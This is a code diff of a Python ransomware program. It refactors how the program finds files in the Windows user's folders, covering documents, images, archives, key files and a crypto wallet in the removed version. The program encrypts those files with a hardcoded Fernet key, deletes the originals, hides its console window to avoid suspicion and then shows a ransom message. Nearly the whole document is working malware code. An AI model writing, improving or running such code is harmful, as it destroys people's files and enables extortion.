@@ -5,9 +5,7 @@ import glob
 import os
 import subprocess
 import time
-import tkinter
 from ftplib import FTP
-from tkinter import messagebox
 
 import nmap
 import win32con
@@ -75,60 +73,43 @@ def ftp_work():
             pass
 
 
-def encrypt_file():
-    # This function encrypts the files with a key
-    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
-    usr = getpass.getuser()
+f_name = []
+targets = ('.txt', '.docx', '.doc', '.lnk',
+           '.xlsx', '.pdf', '.zip', '.ppt',
+           '.jpg', '.jpeg', 'gif', '.mp3',
+           '.mp4', '.svg', '.ico', '.3gp',
+           'ink', '.gz', '.rar', '.wav',
+           '.iso', '.java', '.html', '.css',
+           '.key', '.enc')
 
-    # Get files to encrypt
-    if True:
-        # Get documents in current user to encrypt
-        path = 'C:/Users/' + usr
-        for f_name in glob.glob(path + '/**/*.txt', recursive=True) \
-                      + glob.glob(path + '/**/*.docx', recursive=True) \
-                      + glob.glob(path + '/**/*.pdf', recursive=True) \
-                      + glob.glob(path + '/**/*.ppt', recursive=True) \
-                      + glob.glob(path + '/**/*.zip', recursive=True) \
-                      + glob.glob(path + '/**/*.jpeg', recursive=True) \
-                      + glob.glob(path + '/**/*.png', recursive=True) \
-                      + glob.glob(path + '/**/*.svg', recursive=True) \
-                      + glob.glob(path + '/**/*.zip', recursive=True) \
-                      + glob.glob(path + '/**/*.xlsx', recursive=True) \
-                      + glob.glob(path + '/**/*.pdf', recursive=True) \
-                      + glob.glob(path + '/**/*.wav', recursive=True) \
-                      + glob.glob(path + '/**/*.mp3', recursive=True) \
-                      + glob.glob(path + '/**/*.mp4', recursive=True) \
-                      + glob.glob(path + '/**/*.3gp', recursive=True) \
-                      + glob.glob(path + '/**/*.iso', recursive=True) \
-                      + glob.glob(path + '/**/*.ico', recursive=True) \
-                      + glob.glob(path + '/**/*.lnk', recursive=True) \
-                      + glob.glob(path + '/**/*.ink', recursive=True) \
-                      + glob.glob(path + '/**/*.xls', recursive=True) \
-                      + glob.glob(path + '/**/*.dll', recursive=True) \
-                      + glob.glob(path + '/**/*.html', recursive=True) \
-                      + glob.glob(path + '/**/*.gz', recursive=True) \
-                      + glob.glob(path + '/**/*.css', recursive=True) \
-                      + glob.glob(path + '/**/*.js', recursive=True) \
-                      + glob.glob(path + '/**/*.3gp', recursive=True) \
-                      + glob.glob(path + '/**/*.key', recursive=True) \
-                      + glob.glob(path + '/**/wallet.dat', recursive=True) \
-                      + glob.glob(path + '/**/*.tar', recursive=True) \
-                      + glob.glob(path + '/**/*.tgz', recursive=True) \
-                      + glob.glob(path + '/**/*.rar', recursive=True) \
-                      + glob.glob(path + '/**/*.java', recursive=True):
-            
-            k = key
-            f = Fernet(k)
-            try:
-                with open(f_name, "rb") as file:
-                    file_data = file.read()
-                    encrypted_data = f.encrypt(file_data)
-                with open(f_name + '.crypy', "wb") as file:
-                    file.write(encrypted_data)
-                    os.remove(f_name)
-            except Exception as e:
-                print(e)
-                pass
+
+def find_file():
+    usr = getpass.getuser()
+    # Get files to encrypt from current user
+    path = 'C:/Users/' + usr + '/'
+    for r, d, files in os.walk(path):
+        for file in files:
+            if file.endswith(targets):
+                f_name.append(os.path.join(r, file))
+                print(f_name)
+                break
+
+
+def encrypt_file():
+    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
+    for fn in f_name:
+        k = key
+        f = Fernet(k)
+        try:
+            with open(fn, "rb") as file:
+                file_data = file.read()
+                encrypted_data = f.encrypt(file_data)
+            with open(fn + '.crypy', "wb") as file:
+                file.write(encrypted_data)
+                print(file)
+                os.remove(fn)
+        except Exception:
+            pass
 
 
 def message():
@@ -181,23 +162,11 @@ def delete_ransomware():
 
 
 def main():
-    from threading import Thread
-
     # Hides the terminal console to prevent suspicion while working in background
     hide = win32gui.GetForegroundWindow()
     win32gui.ShowWindow(hide, win32con.SW_HIDE)
-
-    threads = 20
-    jobs = []
-    for t in range(0, threads):
-        thread = Thread(target=encrypt_file())
-        jobs.append(thread)
-    for j in jobs:
-        j.start()
-    for j in jobs:
-        j.join()
-        pass
-
+    find_file()
+    encrypt_file()
     message()
     # ransom_note()
     # show_ransom_note()
